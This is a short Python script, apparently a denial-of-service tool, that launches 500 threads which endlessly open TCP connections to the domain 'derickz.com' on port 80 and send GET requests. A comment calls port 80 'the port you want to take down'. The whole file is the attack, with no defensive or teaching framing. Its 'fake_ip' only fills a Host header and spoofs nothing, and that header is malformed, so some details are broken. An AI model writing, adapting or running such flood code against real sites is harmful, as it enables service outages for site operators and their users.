import threading
import socket

target = 'derickz.com'
port =  80 # The port you want to take down
fake_ip  = '173.22.5.15'

already_connected = 0


def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode("ascii"), (target, port))
        s.sendto(("Host: " + fake_ip + "r\n\r\n").encode("ascii"), (target, port))
        s.close()

for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()